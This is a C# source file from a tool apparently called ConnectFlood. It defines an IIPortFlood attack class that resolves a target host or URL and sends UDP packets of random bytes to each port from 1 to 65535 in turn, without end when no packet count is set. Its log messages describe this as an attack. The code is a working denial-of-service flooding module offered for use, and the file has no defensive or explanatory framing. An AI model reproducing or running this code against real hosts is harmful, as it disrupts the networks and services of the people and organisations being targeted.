using System;
using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace ConnectFlood
{
    public class IIPortFlood : IAttack
    {
        private Random random = new Random(); 

        public void StartFlood(string target, int packetCount, int speed, string none)
        {
            IPAddress targetIP;
            if (target.StartsWith("http://", StringComparison.OrdinalIgnoreCase))
            {
                target = target.Substring(7);
            }
            else if (target.StartsWith("https://", StringComparison.OrdinalIgnoreCase))
            {
                target = target.Substring(8);
            }
            int colonIndex = target.IndexOf(':');
            if (colonIndex > 0)
            {
                target = target.Substring(0, colonIndex);
            }
            try
            {
                if (!IPAddress.TryParse(target, out targetIP))
                {
                    targetIP = Dns.GetHostAddresses(target)[0];
                    Console.WriteLine($"[IIPORT] Resolved {target} to {targetIP}");
                }
            }
            catch
            {
                Console.WriteLine("[IIPORT] Invalid IP address or domain!");
                return;
            }

            Console.WriteLine($"[IIPORT] Attacking {targetIP} | Packets: {(packetCount == -1 ? "∞" : packetCount.ToString())} | Speed: {speed}ms");

            int sentPackets = 0;
            int port = 1;

            while (packetCount == -1 || sentPackets < packetCount)
            {
                try
                {
                    Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
                    byte[] data = new byte[32];
                    random.NextBytes(data);

                    IPEndPoint endPoint = new IPEndPoint(targetIP, port);
                    socket.SendTo(data, endPoint);
                    socket.Close();

                    Console.WriteLine($"[IIPORT] Packet {sentPackets + 1} sent to {targetIP}:{port}");

                    sentPackets++;
                    port++;

                    if (port > 65535) port = 1;

                    Thread.Sleep(speed);
                }
                catch (Exception ex)
                {
                    Console.WriteLine($"[IIPORT] Error: {ex.Message}");
                }
            }
            Console.WriteLine("[IIPORT] Attack finished.");
        }
    }
}
